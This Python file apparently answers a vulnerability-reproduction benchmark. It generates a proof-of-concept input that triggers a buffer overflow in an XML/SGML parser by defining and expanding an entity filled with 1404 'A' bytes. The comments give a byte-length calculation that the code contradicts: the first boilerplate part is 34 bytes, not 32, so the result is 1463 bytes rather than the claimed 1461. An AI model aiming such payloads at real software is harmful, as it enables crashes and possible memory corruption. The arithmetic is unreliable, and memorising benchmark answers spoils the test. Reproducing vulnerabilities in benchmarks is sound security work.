class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description points to a classic XML/SGML entity
        # expansion attack. A custom entity is defined with a long value,
        # and its subsequent use causes a buffer overflow upon expansion.
        # The ground-truth PoC length of 1461 bytes allows us to calculate
        # the exact payload size needed.
        #
        # PoC structure:
        # <!DOCTYPE doc [<!ENTITY overflow "PAYLOAD">]><doc>&overflow;</doc>
        #
        # Boilerplate length calculation:
        # part1 = b'<!DOCTYPE doc [<!ENTITY overflow "' -> 32 bytes
        # part2 = b'">]><doc>&overflow;</doc>'         -> 25 bytes
        # Total boilerplate = 57 bytes.
        #
        # Payload length = Total length - Boilerplate length
        #                = 1461 - 57 = 1404 bytes.

        payload_length = 1404
        overflow_payload = b'A' * payload_length

        poc = (
            b'<!DOCTYPE doc [<!ENTITY overflow "'
            + overflow_payload
            + b'">]><doc>&overflow;</doc>'
        )

        return poc